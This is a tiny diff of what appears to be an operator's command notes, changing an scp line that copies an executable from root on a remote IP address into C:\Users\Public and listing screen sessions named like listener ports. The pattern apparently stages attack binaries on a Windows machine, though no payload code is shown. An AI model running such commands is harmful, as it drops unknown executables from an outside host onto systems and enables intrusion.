@@ -1,4 +1,4 @@
-scp root@146.190.83.1:windows44442.exe C:\Users\Public
+scp root@146.190.83.1:windows5555.exe C:\Users\Public
 screen -r windows4444
 screen -r windows5555
 
